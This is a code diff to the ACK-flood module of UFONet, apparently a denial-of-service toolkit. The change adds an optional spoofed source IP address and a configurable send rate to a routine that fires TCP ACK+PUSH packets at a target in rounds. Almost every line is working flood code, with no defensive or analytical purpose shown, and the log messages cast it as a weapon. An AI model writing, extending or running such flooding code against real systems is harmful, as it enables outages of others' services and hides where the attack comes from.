@@ -10,6 +10,8 @@ with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, random, socket
+
+from core.mods.mod_config import ACKFLOOD_SPEED
 try:
     from urlparse import urlparse
 except:
@@ -29,7 +31,7 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x
 
-def ackize(ip, sport, rounds):
+def ackize(ip, sport, rounds, source=None):
     n=0
     try:
         for x in range (0,int(rounds)):
@@ -38,7 +40,12 @@ def ackize(ip, sport, rounds):
             seq = randInt()
             window = randInt()
             IP_p = IP()
-            IP_p.src = randIP()
+            if source is None:
+                print("[Info] [UFOACK] Using random source IP")
+                IP_p.src = randIP()
+            else:
+                print("[Info] [UFOACK] Using given source IP")
+                IP_p.src = source
             try:
                 IP_p.dst = ip
             except:
@@ -53,14 +60,14 @@ def ackize(ip, sport, rounds):
             try:
                 send(IP_p/TCP_l, verbose=0)
                 print("[Info] [AI] [UFOACK] Firing 'ionized crystals' ["+str(n)+"] -> [IONIZING!]")
-                time.sleep(1) # sleep time required for balanced sucess
+                time.sleep(1/ACKFLOOD_SPEED) # sleep time required for balanced sucess
             except:
                 print("[Error] [AI] [UFOACK] Failed to engage with 'ionized crystals' ["+str(n)+"]")
     except:
         print("[Error] [AI] [UFOACK] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class UFOACK(object):
-    def attacking(self, target, rounds):
+    def attacking(self, target, rounds, source = None):
         print("[Info] [AI] TCP 'ACK+PUSH' (UFOACK) is ready to fire: [" , rounds, "ionized crystals ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -84,4 +91,4 @@ class UFOACK(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [UFOACK] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        ackize(ip, sport, rounds) # attack with UFOACK using threading
+        ackize(ip, sport, rounds, source) # attack with UFOACK using threading
